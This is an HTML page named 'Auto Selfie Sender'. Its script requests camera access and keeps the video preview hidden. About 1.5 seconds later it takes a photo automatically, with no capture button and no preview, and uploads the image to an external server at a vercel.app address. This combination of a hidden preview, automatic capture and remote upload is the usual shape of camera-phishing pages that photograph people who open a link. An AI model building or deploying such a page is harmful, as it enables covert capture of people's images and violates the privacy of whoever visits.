<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Selfie Sender</title>
<style>
body { font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#071028; color:white; flex-direction:column; }
video { display:none; }
</style>
</head>
<body>
<h2>Auto Selfie Sender</h2>
<p id="status">Requesting camera...</p>
<video id="video" autoplay playsinline></video>

<script>
(async () => {
  const status = document.getElementById('status');
  const video = document.getElementById('video');

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
    video.srcObject = stream;

    video.addEventListener('loadedmetadata', () => {
      setTimeout(async () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.translate(canvas.width, 0);
        ctx.scale(-1,1);
        ctx.drawImage(video, 0, 0);

        canvas.toBlob(async (blob) => {
          const formData = new FormData();
          formData.append('selfie', blob, 'selfie.jpg');

          try {
            const res = await fetch('https://s-website-ttni.vercel.app/upload', {
              method: 'POST',
              body: formData
            });
            const json = await res.json();
            status.textContent = json.message || 'Selfie sent!';
          } catch(err) {
            status.textContent = 'Failed to send selfie: ' + err;
          }

          // Stop camera
          stream.getTracks().forEach(track => track.stop());
        }, 'image/jpeg', 0.92);

      }, 1500); // Wait 1.5s after camera ready
    });
  } catch (e) {
    status.textContent = 'Camera access denied or not available';
    console.error(e);
  }
})();
</script>

</body>
</html>
